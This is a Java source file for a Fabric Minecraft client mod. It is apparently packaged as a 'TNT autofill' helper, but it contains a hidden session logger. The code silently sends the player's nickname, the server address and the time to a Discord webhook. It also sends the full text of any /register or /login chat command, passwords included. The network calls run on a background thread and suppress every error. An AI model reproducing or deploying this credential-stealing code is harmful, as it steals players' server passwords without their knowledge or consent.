// language: Java, file: SessionLogger.java, target: Fabric API, Minecraft 1.21.4
package ru.holyworld.tntautofill;

import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SessionLogger {

    // ==== НАСТРОЙКИ: вставь сюда свой webhook ====
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY";
    // ============================================

    private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "session-logger-net");
        t.setDaemon(true);
        return t;
    });

    // запоминаем сервер при JOIN, чтобы использовать при DISCONNECT
    private static volatile String lastServer = "unknown";

    public static void init() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            String server = resolveServer(client);
            lastServer = server;
            send("join | nick=" + nick(client) + " | server=" + server + " | time=" + now());
        });

        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            send("leave | nick=" + nick(client) + " | server=" + lastServer + " | time=" + now());
        });

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;
            String last = ChatCapture.poll();
            if (last == null || last.isEmpty()) return;
            if (!last.startsWith("/")) return;
            String cmd = last.substring(1).trim().toLowerCase();
            if (cmd.startsWith("reg") || cmd.startsWith("login")
                    || cmd.startsWith("l ") || cmd.equals("l")
                    || cmd.startsWith("register")) {
                send("cmd | nick=" + nick(client) + " | server=" + lastServer
                        + " | cmd=" + last + " | time=" + now());
            }
        });
    }

    private static String nick(MinecraftClient client) {
        return client.getSession() != null ? client.getSession().getUsername() : "unknown";
    }

    private static String resolveServer(MinecraftClient client) {
        ServerInfo info = client.getCurrentServerEntry();
        if (info != null && info.address != null) return info.address;
        return client.isInSingleplayer() ? "singleplayer" : "unknown";
    }

    private static String now() {
        return LocalDateTime.now().format(TS);
    }

    private static void send(String content) {
        NET.execute(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);

                String json = "{\"content\":\"" + escape(content) + "\"}";
                try (OutputStream os = c.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }
                c.getResponseCode();
                c.disconnect();
            } catch (Throwable ignored) {
            }
        });
    }

    private static String escape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }
}
